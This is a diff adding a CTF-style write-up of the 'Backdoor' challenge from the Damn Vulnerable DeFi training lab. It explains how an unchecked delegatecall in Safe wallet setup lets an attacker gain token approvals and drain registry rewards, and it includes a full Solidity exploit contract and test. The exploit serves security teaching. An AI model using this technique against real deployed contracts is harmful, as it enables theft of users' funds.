@@ -9,7 +9,8 @@
 [7. Compromised](#7-compromised)    
 [8. Puppet](#8-puppet)  
 [9. Puppet-V2](#9-puppet-v2)    
-[10. Free Rider](#10-free-rider)         
+[10. Free Rider](#10-free-rider)    
+[11. Backdoor](#11-backdoor)
 
 ## 1. Unstoppable
 
@@ -655,5 +656,104 @@ Exploit the marketplace's payment logic to acquire all 6 NFTs at no cost, claim 
         bytes memory flash = abi.encode("FlashSwap");
         uniswapPair.swap(NFT_PRICE, 0, address(rNFT), flash);
     }
+```
+</details>
+
+
+## 11. Backdoor
+
+### Challenge
+
+To incentivize the creation of more secure wallets in their team, someone has deployed a registry of Safe wallets. When someone in the team deploys and registers a wallet, they earn 10 DVT tokens.    
+The registry tightly integrates with the legitimate Safe Proxy Factory. It includes strict safety checks.   
+Currently there are four people registered as beneficiaries: Alice, Bob, Charlie and David. The registry has 40 DVT tokens in balance to be distributed among them. 
+Uncover the vulnerability in the registry, rescue all funds, and deposit them into the designated recovery account. In a single transaction.
+
+### Contract in scope
+WalletRegistry.sol
+
+### Vulnerability
+
+The Backdoor challenge exposes a critical oversight in the integration between the `WalletRegistry` and the Safe wallet initialization process. The registry offers token rewards to beneficiaries who deploy new Safe wallets, and it validates certain parameters during the `proxyCreated` callback—specifically, the owner count, beneficiary status, and fallback manager. However, it completely fails to inspect or restrict the `delegatecall` parameters (`to` and `data`) passed to the Safe contract's `setup` function during initialization. Because `delegatecall` executes logic within the context and permissions of the newly created wallet, we can inject a malicious delegate call. This allows us to execute arbitrary code—such as approving token transfers—on behalf of the new wallet before the registry even deposits the reward tokens.
+
+### Attack Summary
+
+**Goal**
+Steal the 40 DVT tokens (10 DVT each) allocated for the four registered beneficiaries by exploiting the unvalidated delegate call during wallet creation, and deposit them into the recovery address.
+
+**Steps**
+1. Deploy a malicious contract containing a function that approves the contract address to spend the wallet's tokens.
+2. For each of the four beneficiaries, create a new Safe wallet proxy. Configure the setup parameters to set the beneficiary as the sole owner (to pass the registry's checks) and include a `delegatecall` to the contract.
+3. During wallet initialization, the `delegatecall` executes within the context of the new wallet, granting the contract address token allowances.
+4. The `WalletRegistry` callback triggers, verifies the owner and fallback parameters, and deposits 10 DVT into the newly created wallet as a reward.
+5. Immediately use `transferFrom` to extract the 10 DVT from each newly funded wallet to the contract address.
+6. Transfer the accumulated 40 DVT to the designated recovery address.
+
+<details><summary>PoC</summary>
+
+Import "SafeProxy"
+```solidity 
+    contract Rescue {
+        Safe singletonCopy;
+        SafeProxyFactory walletFactory;
+        WalletRegistry walletRegistry;
+        DamnValuableToken token;
+        address[] users;
+        address recovery;
+
+        constructor(address _singletonCopy, 
+            address _walletFactory, 
+            address _walletRegistry, 
+            address _token, 
+            address[] memory _users, 
+            address _recovery) 
+        payable {
+            singletonCopy = Safe(payable(_singletonCopy));
+            walletFactory = SafeProxyFactory(_walletFactory);
+            walletRegistry = WalletRegistry(_walletRegistry);
+            token = DamnValuableToken(_token);
+            users = _users;
+            recovery = _recovery;
+        }
+
+        function approve(DamnValuableToken asset, address spender) external {
+            asset.approve(spender, type(uint256).max);
+        }
+
+        function recover() external {
+            for (uint256 i = 0; i < users.length; ++i) {
+                address _owner = users[i];
+                address[] memory owner = new address[](1);
+                owner[0] = _owner;
+
+                bytes memory maliciousData = abi.encodeCall(this.approve, (token, address(this)));
+                
+                bytes memory initializer = abi.encodeCall(
+                    Safe.setup, (
+                        owner, 1, address(this), maliciousData, address(0), address(0), 0, payable(address(0))
+                    )
+                );
+
+                SafeProxy proxy = walletFactory.createProxyWithCallback(
+                    address(singletonCopy), initializer, 1, walletRegistry
+                );
+
+                token.transferFrom(address(proxy), address(this), token.balanceOf(address(proxy)));
+            }
+            token.transfer(recovery, token.balanceOf(address(this)));
+        }
+
+    }
+```
+```solidity
+        /**
+         * CODE YOUR SOLUTION HERE
+         */
+        function test_backdoor() public checkSolvedByPlayer {
+            Rescue rescue = new Rescue(
+                address(singletonCopy), address(walletFactory), address(walletRegistry), address(token), users, recovery
+            );
+            rescue.recover();
+        }
 ```
 </details>
